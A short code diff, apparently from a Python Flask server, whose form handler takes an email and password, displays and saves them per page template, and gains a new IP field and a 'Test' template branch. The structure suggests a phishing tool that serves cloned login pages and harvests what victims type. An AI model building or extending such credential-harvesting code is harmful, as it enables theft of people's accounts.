@@ -38,9 +38,13 @@ class Server:
         
         email = request.form['email']
         password = request.form['password']
+        ip = request.form['ip']
 
-        props.show_data(email, password)
-        manage_data.save_data(template, email, password)
+        if(template == 'Test'):
+            props.show_data_test(email, password, ip)
+        else:
+            props.show_data(email, password)
+            manage_data.save_data(template, email, password)
 
         return render_template(f"{template}/index.html")
 
